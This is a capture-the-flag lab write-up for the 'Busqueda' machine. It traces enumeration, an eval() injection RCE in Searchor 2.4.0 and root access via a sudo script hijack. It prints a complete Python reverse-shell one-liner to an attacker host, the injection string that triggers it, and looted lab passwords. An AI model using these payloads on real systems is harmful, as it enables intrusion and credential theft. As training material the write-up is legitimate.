# Busqueda
#### _June 30th 2023_

#### Difficulty: <span style="color:green">Easy</span>


---
<br>
I started the lab with a quick scan. We have ssh and http ports open. Next I ran full scan with scripts and service version detection on all ports. This told us the server is using Apache 2.4.52, but not anything else too interesting.

<img src="images/nmapquick.png">

After nmap scans were finished i ran gobuster enumeration, which found /search and /server-status paths. Following gobuster I did one more enumeration run using whatweb, which revealed that the server is running werkzeug 2.1.2 and python 3.10.6 code. 

<img src="images/gobusterdir.png">

Now I decided it is time to pay the website a visit on my browser. On the website I see that the application is a search engine, where I can choose my searchengine and then type the query i want to search. On the bottom of the page we can see a footer which says the application is using Searchor 2.4.0. 

<img src="images/website.png">

At this point what I know is that the server is using Apache 2.4.52, Flask back-end / Werkzeug 2.1.2, Searchor 2.4.0 and that the application sends user input queries to the back-end. Now I decided that it is time to start gathering information about the services running in more detail and search for vulnerabilites.

Starting with Apache, I found CVE-2022-22721 affecting Apache version 2.4.52, but thinking about the nature of our task and the environment we are working with, I decided to not pursue this vulnerability any further.

Next I started researching for Flask/Werkzeug vulnerabilities. Using tips from HackTricks and script, I tried to traverse to console endpoint, which didn't work because debug is not enabled on the server. Other than that, this Flask version doesn't seem to have publicly available exploits so I decided to move forward.

After researching Flask it was time to move on to Searchor 2.4.0. On the first google I came across a RCE vulnerability. The vulnerability can be found here. Moving to references on the exploit site there is a link to a Github commit, where we can see an eval() function being removed. This hints that we can probably use the eval() value on the search query as a sink to break out of it and execute malicious code. 

<img src="images/changes.png">

Using PayLoadAllTheThings I found a payload to create reverse shell on Python. Getting the payload to work took a while, but I was able to get a foothold in the target machine. The final payload used was crafted from this:

python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

<img src="images/foothold.png">

To understand why the exploit works you can refer to the changelog of Searchor mentioned above, where you can see that an eval() function was removed from the application. For example, adding a ',1=1# to the 'url' parameter's formatted string literal 'query' gives you a the following string:

f"Engine.{engine}.search('{query}',1=1#', copy_url={copy}, open_web={open})"

which essentially enables the attacker to define any variables and execute any python code on the target machine. The malicious query itself connects the attacker (your host machine) to the target machine, spawns new process (/bin/bash) and duplicates standard input, standard output and standard error for the use of the created process.

After having foothold on the target it was time to start enumerating the machine. First thing i did was upgrade the TTY, after which i started looking around the directories. In the directory /home/svc I found plenty of hidden files, including ones called .mysql_history, and .gitconfig. Reading the .gitconfig file there is some user information: cody@searcher.thb. 

<img src="images/cody.png">

Looking around other important files, including /etc/hosts I noticed a mention about gitea.searcher.htb host. After this I headed to the application directory at /var/www/app and did ls -a on it. The list revealed a hidden .git folder inside which was the whole git repository. The config file included the following line:

url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git.

Maybe this could be codys password?

<img src="images/codypass.png">

Cody does not have account on the machine we are working on now and the password does not work for any other users either. I decided to take a look at gitea.searcher.htb, which seems to be another web application. On the bottom of the page we have a footer saying "Gitea Version 1.18.0+rc1. On the upper right we have sign-in option. Let's try the user and password we just found there. 

<img src="images/gitealogged.png">

That seems to have worked and we are now logged in on cody's account on gitea. Looking around the repository didn't reveal anything interesting other than that there is another user named "administrator". On bottom right I saw a API link, which led me to the gitea api website. I was able to authenticate as cody there and I was able to run some api calls, however this was a deadend that I wasted quite alot time on.

Taking a step back I did find out that I can use cody's password to run sudo svc account on the target machine, allowing me to run sudo commands. 

<img src="images/sudol.png">

Doing sudo -l printed the following:

User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py *.

So I decided to run the above script. The script omitted some usage information indicating that I can list running docker containers. 

<img src="images/checkup.png">

Running docker-ps revealed a running mysql database image. Next, I inspected it further. I found the path to the logs of the docker image, but I was not permitted to access it. After that I took a look at the docs and tried to get a subsection in JSON format of the .Config. It worked, and I noticed the following entries:

"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"

<img src="images/dockerps.png">

Prior experience on this box led me to try both of the above passwords in Gitea to log into administrator account and it worked, and I was able to find a scripts repository. Looking at system-checkup.py I found a line saying that the script runs full-checkup.sh from the present directory. This means I could make a script called full-checkup.sh and system-checkup would call and execute it. 

<img src="images/run_command.png">

I crafted a script called full-checkup.sh that creates a reverse shell on my host machine which has netcat listener on. This gave me root shell. 

<img src="images/script.png">

<img src="images/revshell.png">